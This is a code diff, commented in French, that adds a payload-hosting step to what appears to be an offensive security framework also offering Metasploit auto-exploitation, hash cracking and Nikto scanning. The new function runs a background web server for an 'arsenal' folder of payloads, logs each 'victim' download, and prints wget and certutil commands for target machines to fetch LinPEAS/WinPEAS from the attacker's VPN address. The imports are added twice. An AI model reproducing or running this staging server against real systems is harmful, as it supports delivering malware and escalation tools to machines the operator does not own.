@@ -8,6 +8,9 @@ from rich.prompt import Prompt
 from rich.table import Table
 from rich.panel import Panel
 import questionary
+import http.server
+import socketserver
+import threading
 
 console = Console()
 
@@ -398,6 +401,52 @@ def run_vuln_scanner(ip, open_ports):
         except Exception as e:
             console.print(f"[bold red]Erreur avec Nikto : {e}[/bold red]")
 
+import http.server
+import socketserver
+import threading
+
+# --- ÉTAPE 11 : SERVEUR DE DISTRIBUTION DE PAYLOADS ---
+def serve_payloads():
+    console.print("\n[bold red]🚁 SERVEUR DE LARGAGE DE CHARGES UTILES 🚁[/bold red]")
+    
+    port_input = questionary.text("Sur quel port ouvrir le serveur (ex: 8080) ?", default="8080").ask()
+    if not port_input: return
+    try:
+        PORT = int(port_input)
+    except:
+        return console.print("[bold red]Port invalide.[/bold red]")
+    
+    # Création du dossier d'armes s'il n'existe pas
+    dossier_outils = "arsenal_payloads"
+    if not os.path.exists(dossier_outils):
+        os.makedirs(dossier_outils)
+        console.print(f"[dim yellow][*] Création du dossier '{dossier_outils}'. Glisse tes scripts (LinPEAS, virus, etc.) à l'intérieur ![/dim yellow]")
+
+    # Configuration du mini-serveur Web pointant uniquement sur le dossier d'armes
+    class Handler(http.server.SimpleHTTPRequestHandler):
+        def __init__(self, *args, **kwargs):
+            super().__init__(*args, directory=dossier_outils, **kwargs)
+        def log_message(self, format, *args):
+            # Affiche un message quand la victime télécharge un fichier !
+            console.print(f"[bold magenta]👀 [ALERTE] Connexion entrante : {self.address_string()} a demandé {args[0]}[/bold magenta]")
+
+    httpd = socketserver.TCPServer(("", PORT), Handler)
+
+    def start_server():
+        httpd.serve_forever()
+
+    # Lancement en tâche de fond pour ne pas bloquer le framework
+    t = threading.Thread(target=start_server, daemon=True)
+    t.start()
+    
+    console.print(f"\n[bold green]✅ Serveur de largage actif sur le port {PORT} ![/bold green]")
+    console.print(f"[cyan]Commande à taper sur la machine cible (Linux) :[/cyan] wget http://<TON_IP_VPN>:{PORT}/linpeas.sh")
+    console.print(f"[cyan]Commande à taper sur la machine cible (Windows) :[/cyan] certutil -urlcache -split -f http://<TON_IP_VPN>:{PORT}/winpeas.exe\n")
+    
+    questionary.text("Appuie sur Entrée pour couper le serveur et revenir au menu...").ask()
+    httpd.shutdown()
+    console.print("[dim]Serveur coupé. Retour à la base.[/dim]")
+
 # --- MENU PRINCIPAL (INTERACTIF) ---
 def interactive_menu(ip, open_ports):
     while True:
@@ -421,7 +470,8 @@ def interactive_menu(ip, open_ports):
                 "7. Metasploit Auto-Pwner (Armement auto)",
                 "8. 💀 Cassage de Hashs hors-ligne (John The Ripper)",
                 "9. ☢️ Scanner de Vulnérabilités Web (Nikto)",
-                "10. 🚪 Générer Rapport & Quitter"
+                "10. 🚁 Héberger/Distribuer des payloads (Serveur Web local)",
+                "11. 🚪 Générer Rapport & Quitter"
             ]
         ).ask()
         
@@ -436,9 +486,11 @@ def interactive_menu(ip, open_ports):
         elif "7." in choix: metasploit_autopwn(ip)
         elif "8." in choix: run_cracker()
         elif "9." in choix: run_vuln_scanner(ip, open_ports)
-        elif "10." in choix: 
+        elif "10." in choix: serve_payloads()
+        elif "11." in choix: 
             generer_html()
             break
+
 
 if __name__ == "__main__":
     auto_update()
